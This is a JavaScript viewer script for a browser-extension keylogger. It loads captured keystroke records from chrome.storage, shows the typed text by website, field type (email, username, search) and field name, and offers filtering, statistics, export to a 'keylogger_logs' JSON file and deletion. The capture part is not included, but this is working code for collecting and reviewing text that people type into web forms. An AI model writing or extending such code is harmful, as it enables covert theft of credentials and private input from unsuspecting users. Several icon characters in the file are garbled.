let allLogs = [];

// Function to load and display logs
function loadLogs(filter = '') {
    chrome.storage.local.get(['keylogs'], function(result) {
        allLogs = result.keylogs || [];
        
        // Apply filter if exists
        let filteredLogs = allLogs;
        if (filter) {
            filteredLogs = allLogs.filter(log => 
                log.hostname.toLowerCase().includes(filter.toLowerCase())
            );
        }
        
        displayLogs(filteredLogs);
        updateStatistics(allLogs);
    });
}

// Function to display logs on screen
function displayLogs(logs) {
    const output = document.getElementById('output');
    
    if (logs.length === 0) {
        output.innerHTML = `
            <div class="empty-state">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
                <h2>No records yet</h2>
                <p>Visit some websites and type something to start capturing data</p>
            </div>
        `;
        return;
    }
    
    // Display most recent logs first
    const logsHTML = logs.reverse().map((log, index) => {
        // Determine icon based on field type
        let icon = '📝';
        if (log.fieldType === 'email' || log.tipoCampo === 'email') icon = '�';
        else if (log.fieldType === 'username' || log.tipoCampo === 'usuario') icon = '�';
        else if (log.fieldType === 'search') icon = '�';
        
        // Handle both English and Spanish field names for compatibility
        const fieldType = log.fieldType || log.tipoCampo || 'text';
        const fieldName = log.fieldName || log.nombreCampo || 'unknown';
        const text = log.text || log.texto || '';
        const date = log.date || log.fecha || '';
        
        return `
        <div class="log-entry">
            <div class="log-header">
                <span class="log-url">${log.hostname}</span>
                <span class="log-time">${date}</span>
            </div>
            <div class="log-meta">
                <span class="log-type">${icon} ${fieldType}</span>
                <span class="log-field">Field: ${fieldName}</span>
            </div>
            <div class="log-text">${escapeHTML(text)}</div>
        </div>
    `;
    }).join('');
    
    output.innerHTML = logsHTML;
}

// Function to update statistics
function updateStatistics(logs) {
    const totalLogs = logs.length;
    const totalChars = logs.reduce((sum, log) => sum + (log.text || log.texto || '').length, 0);
    const uniqueSites = new Set(logs.map(log => log.hostname)).size;
    
    document.getElementById('totalLogs').textContent = totalLogs;
    document.getElementById('totalChars').textContent = totalChars.toLocaleString();
    document.getElementById('totalSites').textContent = uniqueSites;
}

// Function to escape HTML and prevent XSS
function escapeHTML(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Function to export logs as JSON
function exportLogs() {
    if (allLogs.length === 0) {
        alert('No logs to export');
        return;
    }
    
    const dataStr = JSON.stringify(allLogs, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    
    const link = document.createElement('a');
    link.href = url;
    link.download = `keylogger_logs_${new Date().toISOString().split('T')[0]}.json`;
    link.click();
    
    URL.revokeObjectURL(url);
    alert('Logs exported successfully');
}

// Function to clear all logs
function clearLogs() {
    if (allLogs.length === 0) {
        alert('No logs to clear');
        return;
    }
    
    if (confirm(`Are you sure you want to delete ${allLogs.length} record(s)?`)) {
        chrome.storage.local.set({ keylogs: [] }, function() {
            allLogs = [];
            loadLogs();
            alert('All logs have been deleted');
        });
    }
}

// Event Listeners
document.getElementById('viewLogs').addEventListener('click', function() {
    loadLogs();
});

document.getElementById('exportLogs').addEventListener('click', function() {
    exportLogs();
});

document.getElementById('clearLogs').addEventListener('click', function() {
    clearLogs();
});

document.getElementById('filterInput').addEventListener('input', function(e) {
    loadLogs(e.target.value);
});

// Load logs when opening the page
loadLogs();

// Auto-refresh every 5 seconds
setInterval(() => {
    const filter = document.getElementById('filterInput').value;
    loadLogs(filter);
}, 5000);
